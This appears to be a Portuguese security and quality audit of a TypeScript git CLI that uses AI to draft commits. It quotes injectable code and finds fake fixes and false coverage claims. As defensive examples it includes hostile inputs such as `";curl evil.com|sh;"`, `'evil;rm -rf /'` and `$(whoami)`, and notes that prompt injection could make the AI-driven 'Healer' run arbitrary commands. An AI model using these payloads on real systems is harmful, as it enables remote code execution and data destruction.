# Auditoria Completa — Cogit CLI

**Data:** 11/07/2026
**Escopo:** `src/`, `test-automation/`, raiz, `.gitignore`, `.github/`, `CODE_REVIEW/`
**Método:** 4 auditorias paralelas (segurança, qualidade, arquitetura, higiene) + verificação manual de achados críticos
**Status:** Rascunho — aguardando revisão do usuário antes de qualquer implementação

---

## 1. Sumário Executivo

| Severidade      | Itens | Descrição                                               |
|-----------------|-------|---------------------------------------------------------|
| 🔴 Crítico      | 9     | Injeção de comando, validação ausente, código morto    |
| 🟠 Moderado     | 13    | Race condition, memory leak, regex inseguro, duplicação |
| 🟡 Menor        | 11    | Magic numbers, `as any`, type safety, lint             |
| 🔵 Qualidade    | 14    | Refatorações abandonadas, código especulativo, higiene |
| **TOTAL**       | **47**|                                                          |

**Métricas globais:**

- ~750 linhas de código morto (`auto.ts` legado + 4 arquivos `*-refactored.ts` + containers/plugins/adapters não usados)
- 95.4% de cobertura **afirmada** mas **não é medida** por nenhuma ferramenta
- 3 números de versão diferentes no mesmo projeto (`0.1.0` em `package.json`, `1.0.0` em `src/index.ts`, `1.4.0` em badge README)
- 581 KB de relatórios de teste versionados + 410 KB de fixtures misturados com código
- 21 ocorrências de `process.exit` em código de aplicação (impede composição)
- `npm run test:unit` aponta para arquivo que não existe

**Veredito:** a "correção" dos 15 problemas documentados em `CODE_REVIEW/CODE_REVIEW.md` (29/03/2026) foi **cosmética — feita na documentação, não no código**. Dos 15 itens, **14 persistem** com o mesmo trecho de código original. Além disso, foram encontrados **16 novos problemas** não cobertos pelo review anterior.

---

## 2. 🔴 Achados Críticos (P0 — corrigir imediatamente)

### C1. Injeção de comando em `gitCommit` (NÃO corrigido — CODE_REVIEW.md declara correção)
**Arquivo:** `src/services/git/executor.ts:18-26`
**Trecho:**
```typescript
export async function gitCommit(repoPath: string, message: string): Promise<ExecutorResult> {
  try {
    const escapedMessage = message.replace(/"/g, '\\"');
    const { stdout } = await execGit(`commit -m "${escapedMessage}"`, { cwd: repoPath });
```
**Risco:** `$(whoami)`, `` `id` ``, `;rm -rf` executam no shell do usuário. Aspas duplas não protegem contra `$(...)`, backticks, redirecionamentos. Um atacante que controle a mensagem de commit (ou uma IA com prompt injection) consegue RCE.
**Correção:** usar `child_process.spawn` com array de args OU `git commit -F -` lendo via stdin.

### C2. Execução arbitrária via Healer (whitelist não implementada)
**Arquivo:** `src/services/git/healer.ts:69-82`
**Trecho:**
```typescript
const safeCommands = commands.filter(cmd => {
  const lowerCmd = cmd.toLowerCase();
  if (lowerCmd.includes('--force') || lowerCmd.includes('-f ')) return false;
  if (lowerCmd.includes('reset --hard')) return false;
  if (lowerCmd.includes('clean -fd')) return false;
  return true;
});
// ...
await execCommand(cmd, { cwd: input.repoPath });   // L100 — shell:true implícito
```
**Risco:** Apenas 4 padrões bloqueados. `rm -rf`, `chmod`, `chown`, `curl|sh`, `git filter-branch`, `git push --mirror`, `git update-ref`, `eval`, redirecionamentos `>`, tudo passa. A IA executa comandos arbitrários na máquina do usuário.
**Correção:** bloquear lista ampla de comandos perigosos + forçar `git <safe-subcommand>` como único prefixo permitido.

### C3. Injeção de comando via `--branch` (bypass total de validação)
**Arquivo:** `src/services/git/branch.ts:96-98`, `src/infrastructure/adapters/branch.adapter.ts:40`
**Trecho:**
```typescript
// branch.ts:96-98 — switchBranch NÃO chama isValidBranchName()
export async function switchBranch(repoPath: string, branchName: string, autoPush: boolean = true) {
  try {
    await execGit(`checkout ${branchName}`, { cwd: repoPath });
```
**Risco:** `cogit auto --branch 'evil;rm -rf /'` executa. Validação existe, mas não é aplicada em **todos** os pontos de entrada: `switchBranch`, `deleteBranch`, `pushBranch`.
**Correção:** aplicar `isValidBranchName()` em todas as funções públicas de `branch.ts`, `tag.ts`, e adapters.

### C4. Injeção em `tag.ts` sem validação
**Arquivo:** `src/services/git/tag.ts:37-39, 75, 116, 138, 151`
**Trecho:**
```typescript
const { stdout: commit } = await execGit(`rev-list -n 1 ${name}`, { cwd: repoPath });
const { stdout: message } = await execGit(`tag -l -n1 ${name}`, { cwd: repoPath });
const { stdout: date } = await execGit(`log -1 --format=%ci ${name}`, { cwd: repoPath });
// ...
await execGit(`tag -a ${tagName} -m "${escapedMessage}"`, { cwd: repoPath });
```
**Risco:** `pushTag('v1; evil')` ou `resetToTag('--hard')` executa. `isValidTagName()` existe em L18-22 mas **nenhuma função chama**.
**Correção:** aplicar validação em `listTags`, `createTag`, `deleteTag`, `pushTag`, `resetToTag`.

### C5. BranchAdapter e arquivos injetados sem validação
**Arquivo:** `src/infrastructure/adapters/branch.adapter.ts:13-58`
**Trecho:**
```typescript
async create(repoPath: string, name: string): Promise<ExecutorResult> {
  await execAsync(`git checkout -b "${name}"`, { cwd: repoPath });  // sem validação
}
async switch(repoPath: string, name: string) {
  await execAsync(`git checkout "${name}"`, { cwd: repoPath });
}
async delete(repoPath: string, name: string) {
  await execAsync(`git branch -d "${name}"`, { cwd: repoPath });
}
```
**Risco:** Vetor adicional de injeção. O adapter é código morto (ver C8), mas se for reativado por engano o vetor existe. Aspas duplas não protegem contra `$()`, backticks.
**Correção:** ou remover adapter (preferido) ou usar array args + validação.

### C6. `.gitpy-private` permite injeção
**Arquivo:** `src/services/tools/stealth.ts:54-57`
**Trecho:**
```typescript
const { stdout } = await execGit(
  `ls-files --others --exclude-standard "${pattern}" && git ls-files "${pattern}"`,
  { cwd: repoPath }
);
```
**Risco:** Padrão vem de `.gitpy-private` (arquivo de configuração do usuário). Aspas duplas não bloqueiam `` ` `` nem `$()`. Padrão malicioso: `";curl evil.com|sh;"`.
**Correção:** validar pattern contra regex segura + nunca usar shell.

### C7. Memory leak em VibeVault
**Arquivo:** `src/core/vault.ts:28-36`
**Trecho:**
```typescript
static store(data: string): string {
  const refId = `ref-${randomUUID().split('-')[0]}`;
  this.storage.set(refId, data);
  this.metadata.set(refId, { size: Buffer.byteLength(data, 'utf-8'), timestamp: new Date() });
  return refId;
}
```
**Risco:** `withAutoCleanup()` (L67-73) existe mas **não é chamado em `src/services/ai/brain/index.ts:33`**. Diffs grandes persistem indefinidamente. Vazamento cumulativo em CLI de longa duração.
**Correção:** usar `withAutoCleanup` no fluxo de brain OU adicionar TTL com timer scheduler.

### C8. Código morto oferece superfície de ataque
**Arquivos:**
- `src/cli/commands/auto.ts` (281 linhas, NÃO importado por `index.ts`)
- `src/cli/commands/auto/*-refactored.ts` (4 arquivos, ~370 linhas)
- `src/application/use-cases/` (5 use cases, ~600 linhas)
- `src/infrastructure/adapters/` (9 adapters, órfãos)
- `src/core/container.ts`, `src/core/plugins/` (sistemas DI/plugins, não usados)

**Risco:** O `auto.ts` órfão ainda tem **9 chamadas `process.exit()`** sem `finally` — reintroduz a falha C9 do review anterior se for reativado. Adapters importam de ports mas nunca são instanciados: risco de import errado durante manutenção.
**Correção:** **deletar** todos esses arquivos. São **código morto** que infla o repo e o vetor de ataque.

### C9. `process.exit` espalhado impede cleanup
**Arquivos críticos:**
- `src/cli/commands/auto.ts`: **9 chamadas** (L64, 71, 80, 91, 96, 106, 133, 146, 197, 264)
- `src/cli/commands/auto/index.ts`: 1 (L107) — `process.exit(0)` em vez de `return`
- `src/cli/commands/menu.ts`: 2 (L84, 184)
- `src/cli/commands/check-ai.ts`, `check-connectivity.ts`: 1 cada

**Total: 21 ocorrências.**

**Risco:** `process.exit()` chamado dentro de funções de domínio/UI impede composição, testes e reutilização. Quando chamado no meio de uma operação stealth/scan/retry, o `finally` não roda — arquivos ficam inconsistentes. O fluxo correto já existe em `core/errors.ts:handleFatalError`.
**Correção:** substituir todos por `throw new XxxError(...)`. `index.ts` deve ser o único lugar que chama `process.exit` (via `handleFatalError`).

---

## 3. 🟠 Achados Moderados (P1 — próxima sprint)

### M1. Race condition em Stealth Mode (não corrigida)
**Arquivo:** `src/services/tools/stealth.ts:124-138`
**Risco:** `fs.renameSync` em loop sem log e sem rollback. Crash no meio deixa arquivos em estado inconsistente.

### M2. Erro silencioso em Scanner (não corrigido — campo `warnings` ausente)
**Arquivo:** `src/services/git/scanner.ts:36-47`, `interface ScanResult`
**Trecho:**
```typescript
for (const file of untrackedFiles) {
  try { ... }
  catch { /* Skip files that can't be read */ }
}
```
**Risco:** Arquivos binários/ilegíveis ignorados sem aviso. `interface ScanResult` (L10-17) **não tem campo `warnings`** — correção parcialmente documentada em CODE_REVIEW.md.
**Correção:** adicionar `warnings: UnreadableFile[]` ao `ScanResult` e exibir aviso.

### M3. Validação de Branch fraca + bypass
**Arquivo:** `src/services/git/branch.ts:56-62`
**Trecho:**
```typescript
function isValidBranchName(name: string): boolean {
  const pattern = /^[a-zA-Z0-9][a-zA-Z0-9._/-]*$/;
  const reserved = ['HEAD', 'head'];
  return pattern.test(name) && !reserved.includes(name.toLowerCase());
}
```
**Risco:** Permite `..`, `@{`, `--`, `.lock`, `-`, `feature/../main`. Mesmo que C3 (validação não aplicada), a regex em si é permissiva.

### M4. Validação de Tag fraca + bypass
**Arquivo:** `src/services/git/tag.ts:18-22`
**Risco:** Idêntico a M3, para tags. `isValidTagName` não é chamado por nenhuma função pública.

### M5. Timeout não limpo em Ollama
**Arquivo:** `src/services/ai/providers/ollama.ts:71-81`
**Trecho:**
```typescript
const controller = new AbortController();
const timeout = setTimeout(() => controller.abort(), 3000);
const response = await fetch(`${this.baseURL}/api/tags`, { signal: controller.signal });
clearTimeout(timeout);   // só limpa em sucesso
```
**Risco:** Se `fetch` lança exceção, `clearTimeout` não é chamado — timer órfão mantém event loop vivo, impede shutdown gracioso.
**Correção:** `try { ... } finally { clearTimeout(timeout); }`.

### M6. Regex sem escape no Sanitizer
**Arquivo:** `src/services/security/sanitizer.ts:29-32`
**Trecho:**
```typescript
if (pattern.includes('*')) {
  const regex = new RegExp(`^${normalizedPattern.replace(/\*/g, '.*')}$`);
  return regex.test(normalizedFilename);
}
```
**Risco:** Caracteres regex especiais (`.`, `+`, `?`, `[`, `]`) não são escapados. Padrão `[abc]` causa crash por regex inválida. Falsos positivos/negativos.
**Correção:** `escapeRegex()` antes de criar RegExp.

### M7. Duplicação massiva em `auto-push.ts` (não corrigida)
**Arquivo:** `src/services/network/auto-push.ts` (343 linhas)
**Funções:** `autoPushBranch` (L34-126), `autoPushTag` (L131-223), `autoPushAllTags` (L228-309) — **~95% idênticas**, ~200 linhas quase duplicadas.
**Risco:** CODE_REVIEW.md declara refatoração para `autoPushGeneric()`, mas **o código original** ainda está lá. Relatório `auto-push-correction-report.md` é cosmético.
**Correção:** extrair `executeAutoPush(command, name, type, options)`.

### M8. Scanner recursivo sem proteção (DoS)
**Arquivo:** `src/services/diagnostics/resources.ts:27-67`
**Risco:**
- Sem proteção contra symlinks → loop infinito se symlink aponta para pai.
- `fs.readdirSync` lança em diretório sem permissão → crash.
- Sem limite de profundidade → `RangeError: Maximum call stack` em árvores profundas.

### M9. Debug log persiste secrets pré-redação
**Arquivo:** `src/cli/ui/debug-logger.ts:39-51` + `src/services/ai/brain/index.ts:67-75`
**Risco:** `redactDiff` aplicado em `brain/index.ts:49` mas `logRequest` (L68) é chamado **depois** gravando diff **com secrets** em `.vibe-debug.log`. O log fica no `repoPath` e pode ser commitado por engano.

### M10. Type mismatch via `as any` (bug latente)
**Arquivo:** `src/services/network/auto-push.ts:99, 114, 196, 211, 282, 297` vs `src/services/network/retry-handler.ts:189`
**Trecho:**
```typescript
// retry-handler.ts:189 (espera array)
export function getRetrySummary(attempts: RetryAttempt[]): string {
// auto-push.ts:99 (passa number, com as any)
console.log(chalk.gray(`   ${getRetrySummary(pushResult.attempts as any)}`));
```
**Risco:** CODE_REVIEW.md declara correção com `getRetrySummaryFromCount` — função **não existe no código**. Type safety bypassada, runtime pode receber string inesperada.

### M11. Sobrescrita destrutiva de `.gitignore`
**Arquivo:** `src/services/tools/stealth.ts:78-85`
**Risco:** `writeFileSync` sem backup se arquivo não existir. `createPrivateConfig` (L234-244) sobrescreve `.gitpy-private` sem confirmação.

### M12. Injeção via `.gitpy-private` (relacionado a C6)
Ver C6.

### M13. Redator incompleto para secrets modernos
**Arquivo:** `src/services/security/redactor.ts:6-27`
**Risco:** 5 padrões originais. **Não cobre:** AWS Secret Access Keys (40 chars base64), JWTs (`eyJ...`), PEM private keys (`-----BEGIN RSA PRIVATE KEY-----`), GitHub tokens (`ghp_*`), Slack (`xoxb-`), Stripe (`sk_live_*`), connection strings (`mongodb://user:pass@host`), URLs com credenciais embutidas.
**Impacto:** credenciais vazam no diff enviado à IA.

---

## 4. 🟡 Achados Menores (P2 — backlog)

### m1. Empty fallback em providers AI (`OpenAI`, `OpenRouter`, `Groq`)
**Arquivos:** `src/services/ai/providers/{openrouter,openai,groq}.ts:29,25,25`
**Trecho:**
```typescript
return completion.choices[0]?.message?.content || '';
```
**Risco:** Resposta vazia indistinguível de falha; commit com mensagem vazia silenciosamente possível.

### m2. Debug log DoS
**Arquivo:** `src/cli/ui/debug-logger.ts:39-51`
**Risco:** `JSON.stringify` em mensagem grande = alocação excessiva; `appendFileSync` em arquivo grande = O(n²) sync.

### m3. `confirmDestructiveOperation` usa `Math.random`
**Arquivo:** `src/utils/confirmation.ts:11-20`
**Risco:** Previsível. Não-crítico pois é UX, mas fraco academicamente.

### m4. `parseInt` sem validação `NaN` em env
**Arquivo:** `src/config/env.ts:28-35`
**Risco:** `AUTO_PUSH_DELAY=garbage` → `NaN` → `NaN * 1000 = NaN` → delay de segurança desativado silenciosamente.

### m5. Sem limite de tamanho em resposta IA no Healer
**Arquivo:** `src/services/git/healer.ts:63-66`
**Risco:** `response.split('\n')` em resposta de 100MB → DoS de memória.

### m6. Timers sem `unref()` no Retry
**Arquivo:** `src/services/network/retry-handler.ts:138, 253, 263`
**Risco:** Event loop não termina gracioso se `process.exit` durante retry.

### m7. Injeção de display em `commit-executor.ts`
**Arquivo:** `src/cli/commands/auto/commit-executor.ts:46-48`
**Risco:** Dry-run com `git commit -m "${options.message}"` — copy-paste do terminal do usuário executa.

### m8. `template: any` em `brain/index.ts:124`
**Arquivo:** `src/services/ai/brain/index.ts:124`
**Risco:** Type safety bypassada.

### m9. Retornos `{ success; error?; autoPushResult?: any }` ad-hoc
**Arquivos:** `src/services/git/branch.ts:67, 96, 121, 139`; `src/services/git/tag.ts:67, 105, 129, 148`
**Risco:** Deveria existir `type GitOperationResult` em `src/types/git.ts`.

### m10. `i18n.ts` sem fallback de JSON malformado
**Arquivo:** `src/config/i18n.ts:25-35`
**Risco:** `JSON.parse` em arquivo malformado crasha app no startup.

### m11. Regex ineficiente em `error-classifier.ts:235-247, 250-262`
**Risco:** Melhorou parcialmente mas `GIT_PATTERNS` e `AI_PATTERNS` ainda usam `match()` mesmo sem `contextExtractor`.

---

## 5. 🔵 Achados de Qualidade e Higiene (P2/P3)

### Q1. Refatorações abandonadas — 4 arquivos `*-refactored.ts` órfãos
**Arquivos:**
- `src/cli/commands/auto/commit-executor-refactored.ts` (147 linhas)
- `src/cli/commands/auto/branch-handler-refactored.ts` (73 linhas)
- `src/cli/commands/auto/stealth-handler-refactored.ts` (83 linhas)
- `src/cli/commands/auto/validator-refactored.ts` (67 linhas)

**Trecho de prova (auto/index.ts:17-21 importa dos NÃO-refatorados):**
```typescript
import { validateConfiguration } from './validator';                  // ❌ legacy
import { handleBranchSwitch } from './branch-handler';                // ❌ legacy
import { handleStealthMode, handleStealthRestore } from './stealth-handler'; // ❌ legacy
import { handleCommitExecution } from './commit-executor';            // ❌ legacy
```
**Decisão necessária:** ou **completar a migração** para classes DI (Priority P1) ou **deletar os 4 arquivos** (Priority P1) — manter ambos cria confusão permanente.

### Q2. Clean Architecture cosmética — `application/` e `infrastructure/` são dead code
**Arquivos:**
- `src/application/use-cases/` (5 use cases + barrel, **0 importadores** em runtime — verificado por grep)
- `src/infrastructure/adapters/` (9 adapters, **0 instâncias** em runtime)

**Verificação:** `gitScanner = new GitScannerAdapter()` aparece em testes unitários que verificam existência, não em produção. O fluxo real é `cli/commands/auto/index.ts → services/git/scanner.ts → execGit()`.

**Decisão:** ou finalizar migração ou deletar ambos. Estado atual: **cosmético**. Os testes "passando" na verdade verificam que classes existem, não que são integradas.

### Q3. `src/core/container.ts` (66 linhas) — DI não usado
**Arquivo:** `src/core/container.ts:18-66`
**Verificação:** `grep ServiceContainer src/` retorna só a própria definição.

### Q4. `src/core/plugins/` — registry + 3 plugins não usados
**Arquivos:** `registry.ts`, `stealth.plugin.ts`, `healer.plugin.ts`, `debug.plugin.ts`
**Risco:** sistema de plugins especulativo, não conectado ao fluxo.

### Q5. Pacotes de arquivos duplicados em `test-automation/scenarios/`
**Pares duplicados:**
- `flags-test.js` ↔ `fase2/flags-test.js`
- `healer-test.js` ↔ `fase2/healer-test.js`
- `i18n-test.js` ↔ `fase1/i18n-test.js`
- `menu-test.js` ↔ `fase2/menu-test.js`
- `security-test.js` ↔ `fase1/security-test.js`

### Q6. 22 scripts top-level em `test-automation/` (entrypoints redundantes)
**Arquivos:**
`generate-report.js`, `test-all-fases.js`, `test-auto-push.js`, `test-comprehensive.js`, `test-exhaustive.js`, `test-fase1.js`, `test-fase2.js`, `test-fase3.js`, `test-fase4.js`, `test-fase5.js`, `test-final-validation.js`, `test-final.js`, `test-full-exhaustive.js`, `test-gitignore-auto.js`, `test-gitignore-manual.js`, `test-ollama-real.js`, `test-ollama-thinking.js`, `test-regression.js`, `test-simple.js`, `test-stress-phase3.js`, `test-report.md`, `TEST_LOG.md`.

### Q7. `package.json:16` referencia arquivo inexistente
```json
"test:unit": "node test-automation/unit/run-unit-tests.js"
```
**Arquivo `run-unit-tests.js` não existe** (`Test-Path` retorna `False`).

### Q8. 3 versões diferentes no mesmo projeto
| Local                          | Versão      |
|--------------------------------|-------------|
| `package.json:3`              | `0.1.0`     |
| `src/index.ts:17` (banner)    | `1.0.0`     |
| `src/index.ts:62` (Commander) | `1.0.0`     |
| `README.md:3` (badge)         | `1.4.0`     |
| `READMEPT.md:3` (badge)       | `1.4.0`     |

### Q9. Cobertura `95.4% / 305 testes` é falsa
**Verificação:**
- Sem framework de cobertura (`jest`, `vitest`, `mocha`, `c8`, `nyc`, `istanbul` ausentes de `package.json`).
- Suite 100% homemade: cada arquivo implementa sua própria `function test()`.
- Badge é imagem estática (`![Tests](...95.4%25_Passing-success)`).
- O número aparece em 5 lugares: `README.md:3`, `:298`, `READMEPT.md:3`, `:298`, `test-automation/test-report.md:1837`.
- **Conflito:** README linha 320-328 lista **66 testes** (PHASE 1=10, ...). Linha 298 diz **305**. Em 2026-03-28 houve 96. **Nenhuma consistência interna.**

### Q10. Múltiplos números de "testes passing" divergem
- README: 305 testes (linha 298), 66 testes (linha 320-328), 95.4% (linha 3).
- READMEPT: idem 305/66/95.4.
- TEST_LOG.md: 96 em 2026-03-28.

### Q11. `.gitignore` incompleto (29 linhas, 337 B)
**Faltando:**
```
.opencode/         # 53 MB local — confirmado untracked mas não ignorado
.windsurf/         # IDE Cascade, não versionado, falta ignorar
test-automation/reports/   # 581 KB de relatórios timestampados versionados
test-automation/temp-test-repo/  # diretório dinâmico criado em CI
coverage/          # caso adicione ferramenta
.env.local
.env.*.local
```

### Q12. Pasta `teste/` com 75 arquivos versionados (410 KB)
**Conteúdo:** 49 `test-multi-N.txt` quase vazios + 3 `multi-{1,2,3}.txt` + `renamed-file.txt` + `file with spaces.txt` + `teste/src/very_long_directory_name/...`
**Histórico:** 7+ commits `feat: add file with spaces` e `chore: remove unnecessary test files` — polui git log.
**Decisão:** mover fixtures canônicos para `test-automation/fixtures/`, ignorar resto.

### Q13. 55 relatórios de teste versionados em `test-automation/reports/` (581 KB)
**Exemplos:**
- `auto-push-test-1774690451687.json`
- `test-all-fases-1774708047717.json`
- `auto-push-correction-report.md`
- `connectivity-fix-report.md`
- `exhaustive-test-report-2026-03-28.md`

**Análise:** outputs de execuções anteriores, congelados para sempre no repo. CI faz upload como artifact (já efêmero), mas a base versionada é histórica.
**Correção:** apagar conteúdo versionado, adicionar `test-automation/reports/*` ao `.gitignore` (mantendo `.gitkeep`).

### Q14. Placeholders vazios na raiz
- `test-feature.ts` (21 B): `// New feature test`
- `test-fix.ts` (17 B): `// Bug fix test`

Ambos são vestígios de WIP. **Ação:** `git rm`.

---

## 6. Achados Adicionais (não cobertos acima)

### A1. `services/` mistura UI com lógica — violação de boundary
**Arquivos:**
- `src/services/git/branch.ts:2-6, 155-294` → `branchCenter()` usa `inquirer`, `chalk`, `separatorLine`
- `src/services/git/tag.ts:2-6, 161-314` → `tagCenter()` mesma mistura
- `src/services/tools/ignore.ts:9, 178-211, 249, 289` → usa `inquirer.prompt` dentro de "service"
- `src/services/network/auto-push.ts:6-7, 72-114` → usa `ora`, `chalk` em "infra"
- `src/services/ai/brain/index.ts:6` → importa `debugLogger` de `cli/ui/`
- `src/core/error-handler/error-presenter.ts:10` → importa `separatorLine` de `cli/ui/`
- `src/core/plugins/types.ts:7` → importa `AutoOptions` de `cli/commands/auto/types`

**Risco:** Em Clean Architecture, `core/` e `services/` não devem depender de `cli/`. Acoplamento direcional invertido.

### A2. Duplicação em `health.ts` — 5 funções idênticas
**Arquivo:** `src/services/diagnostics/health.ts:57-268`
`checkOpenRouter`, `checkGroq`, `checkOpenAI`, `checkGemini`, `checkOllama` — ~95% idênticas exceto por nome/env/modelo.
**Correção:** tabela `PROVIDER_CHECKS` + função genérica.

### A3. UI literals hardcoded
`BOX_WIDTH = 60` em `error-presenter.ts:12`; `'═'.repeat(50)` repetido 5+ vezes em `renderer.ts`; emoji `🔍🔒🏷️🌿🌐✅❌⚠️` espalhados por ~30 arquivos.
**Correção:** constante única `UI_WIDTH` + centralizar strings de UI.

### A4. JSDoc redundante / boilerplate
- 6+ arquivos `auto/*` com cabeçalho `* Single Responsibility: ...` repetido.
- `auto/index.ts:25-28`: JSDoc `@param options Command options` repete o nome.
- `auto/index.ts:138-144`: comentário mais longo que o código que tenta explicar.

### A5. `require()` misturado com `import`
**Arquivos:** `commit-executor-refactored.ts`, `branch-handler-refactored.ts`, `stealth-handler-refactored.ts`, `validator-refactored.ts`, `errors.ts:41, 198`, `connectivity.ts:272, 327`, `auto-push.ts`.

### A6. `loadCommonTrash` path relativo fraco
**Arquivo:** `src/services/tools/ignore.ts:29`
```typescript
const configPath = path.join(__dirname, '../../config/common_trash.json');
```
Quebra quando compilado com paths diferentes.

### A7. CI só roda em `workflow_dispatch`
**Arquivo:** `.github/workflows/test-multi-os.yml`
**Disparo:** apenas manual. CI executa 2 de ~20 scripts (`test:platform` + `test:all`).
**Não roda:** unit, regression, stress, scenarios individuais.

### A8. Docs soltos na raiz
- `FASE-1-MVP.md` (31 KB)
- `FASE-2-AUTOMACAO.md` (15 KB)
- `FASE-3-BRANCH-TAGS.md` (24 KB)
- `FASE-4-SMART-FEATURES.md` (26 KB)
- `FASE-5-DIAGNOSTICS.md` (10 KB)
- `ESPECIFICACOES_COGIT_CLI.md` (34 KB) **+ duplicata menor** `especificacoes-cogit-cli-0c8beb.md` (3.5 KB)
- `cogit-cli-implementation-plan-277cd9.md` (8.6 KB)
- `Ollama.md`, `OpenAI.md`, `openrouter.md`, `groq.txt`

**Sugestão:** mover para `docs/{phases,specs,plans,providers}/`.

---

## 7. Achados Verificados como **NÃO presentes** (boas notícias)

✅ **Zero** ocorrências de `TODO`/`FIXME`/`HACK` em `src/`.
✅ **Domain layer** (`src/domain/entities/`) genuinamente limpo: entidades ricas, imutabilidade via `with*()`, validação.
✅ `src/core/vault.ts:67-73` `withAutoCleanup()` está bem desenhado (só falta ser usado).
✅ `src/core/errors.ts` (hierarquia de erros) é usado consistentemente em produção.
✅ Nomes de variáveis **não contêm** `x`, `tmp`, `foo` — boa hygiene.

---

## 8. Recomendação de Roadmap (3 níveis)

### Nível 1 — Emergência (1-2 sprints) — Segurança
Resolvem os 9 achados Críticos:
- C1: refatorar `executor.ts` para `spawn` array + stdin
- C2: whitelist completa em `healer.ts`
- C3, C4, C5: aplicar validação em **todas** as funções de `branch.ts`, `tag.ts`, adapter
- C6: validar `.gitpy-private` contra regex segura
- C7: usar `withAutoCleanup` no fluxo de `brain/index.ts`
- C8: deletar código morto (`auto.ts` legado, 4 refactoreds, `application/`, `infrastructure/`, `container.ts`, `plugins/`)
- C9: substituir `process.exit` por `throw`

### Nível 2 — Qualidade (1-2 sprints) — Estabilidade
Cobrem os 13 achados Moderados:
- M1–M13: race condition stealth, scanner warnings, validações branch/tag, cleanup timeout, escape regex, dedup auto-push, scan resources, debug log secrets, type mismatch retry, stealth `.gitignore`, injeção `.gitpy-private`, redactor expansivo.

### Nível 3 — Higiene (1 sprint) — Repositório
Cobrem 14+ achados de qualidade:
- Q1–Q4: decidir destino de cada item morto (`*-refactored.ts`, `application/`, `infrastructure/`, `container.ts`, `plugins/`)
- Q5–Q7: dedup tests, consolidar scripts, corrigir `test:unit` quebrado
- Q8: sincronizar versão única em `package.json`
- Q9–Q10: remover badge falso de cobertura ou medir de verdade
- Q11–Q14: `.gitignore` completo, mover `teste/`, apagar relatórios, `git rm` placeholders
- A1–A8: separar UI de services, dedup health, constantes UI, remover JSDoc boilerplate

---

## 9. Decisões em Aberto para o Usuário

Antes de partir para implementação, há decisões estratégicas que o usuário precisa tomar:

**D1 — Sobre código morto (`auto.ts`, `*-refactored.ts`, `application/`, `infrastructure/`):**
- (a) **Deletar tudo** (recomendado se migração hexagonal será abortada)
- (b) **Finalizar migração** para hexagonal (alto esforço, ~2-3 sprints)

**D2 — Sobre o badge `95.4%`:**
- (a) Remover até existir cobertura real
- (b) Substituir por badge dinâmico do `vitest --coverage`
- (c) Manter e ignorar (status quo)

**D3 — Sobre os arquivos `docs/superpowers/specs/YYYY-MM-DD-cogit-audit-design.md` (este doc) e próximos:**
- Após aprovação, qual próximo passo: (a) `writing-plans` para criar plano de implementação priorizado, (b) PR isolado de limpeza de higiene, (c) outro.

---

## 10. Apêndice — Estatísticas

| Métrica                                              | Valor           |
|------------------------------------------------------|-----------------|
| Arquivos `.ts` em `src/`                             | ~95             |
| Linhas de código morto identificado                  | ~750            |
| Achados por severidade                               | 47 (9/13/11/14) |
| `any`/`: any`/`as any`                               | 25+ ocorrências |
| `process.exit` em código de aplicação                | 21              |
| Itens corrigidos / declarados no CODE_REVIEW anterior | 1 / 15 (6.7%)   |
| Tamanho `test-automation/reports/`                   | 581 KB          |
| Tamanho `teste/`                                     | 410 KB          |
| Tamanho `.opencode/` (local, não ignorado)           | ~53 MB          |
| Pastas/layers de Clean Architecture usadas de fato    | 4 / 6           |

---

**Ação recomendada ao usuário:** revisar este documento, decidir sobre os pontos em aberto na seção 9, e indicar se deve prosseguir para a fase de planejamento de implementação via `writing-plans` skill.
